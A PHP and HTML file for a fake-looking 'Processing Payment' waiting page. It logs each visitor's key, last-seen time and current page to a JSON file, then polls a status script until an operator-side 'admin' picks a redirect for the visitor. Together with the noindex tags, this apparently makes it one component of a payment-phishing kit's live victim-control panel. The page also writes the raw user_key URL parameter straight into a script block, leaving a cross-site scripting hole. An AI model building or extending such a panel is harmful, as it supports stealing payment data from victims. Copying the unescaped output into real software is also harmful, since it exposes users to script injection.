<?php
session_start();

$user_key = $_GET['user_key'] ?? '';
if (empty($user_key)) {
    // Try to get from session
    $user_key = $_SESSION['user_key'] ?? '';
    
    if (empty($user_key)) {
        header("Location: index.php");
        exit;
    }
}

// Update user's last seen time
$db_file = 'data/users.db';
if (file_exists($db_file)) {
    $users = json_decode(file_get_contents($db_file), true) ?: [];
    if (isset($users[$user_key])) {
        $users[$user_key]['last_seen'] = time();
        $users[$user_key]['current_page'] = 'loading.php';
        file_put_contents($db_file, json_encode($users, JSON_PRETTY_PRINT));
    }
}
?>
<!DOCTYPE html>
<html lang="en" translate="no">
<head>
    <meta charset="utf-8">
    <meta name="robots" content="noindex">
    <meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <meta name="google" content="notranslate">
    <title>Processing Payment</title>
    <link rel="shortcut icon" href="assets/imgs/favicon.ico">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background-color: #f6f9fc;
            color: #32325d;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            width: 100%;
            max-width: 400px;
            text-align: center;
        }
        
        .spinner {
            width: 60px;
            height: 60px;
            margin: 0 auto 24px;
            border: 5px solid #e6ebf1;
            border-top: 5px solid #94a2b3;
            border-radius: 50%;
            animation: spin 1.5s linear infinite;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .title {
            font-size: 18px;
            font-weight: 600;
            color: #32325d;
            margin-bottom: 8px;
        }
        
        .subtitle {
            font-size: 14px;
            color: #6b7c93;
            line-height: 1.5;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="spinner"></div>
        
        <h1 class="title">Processing your payment<span id="dots">...</span></h1>
        <p class="subtitle">Please wait while we process your transaction</p>
    </div>
    
    <script>
    const userKey = "<?php echo $user_key; ?>";
    
    // Animate dots
    let dotCount = 3;
    const dotsElement = document.getElementById('dots');
    setInterval(() => {
        dotCount = (dotCount + 1) % 4;
        dotsElement.textContent = '.'.repeat(dotCount);
    }, 500);
    
    // Check status every 2 seconds
    async function checkStatus() {
        try {
            const response = await fetch('checkUserStatus.php?key=' + encodeURIComponent(userKey));
            const data = await response.json();
            
            if (data.redirect && data.redirect !== '') {
                // Admin has made a decision - redirect user
                window.location.href = data.redirect;
                return true;
            }
            
            return false;
        } catch (error) {
            console.log('Check failed:', error);
            return false;
        }
    }
    
    // Start checking
    const interval = setInterval(async () => {
        const shouldRedirect = await checkStatus();
        if (shouldRedirect) {
            clearInterval(interval);
        }
    }, 2000);
    
    // Initial check
    checkStatus();
    </script>
</body>
</html>
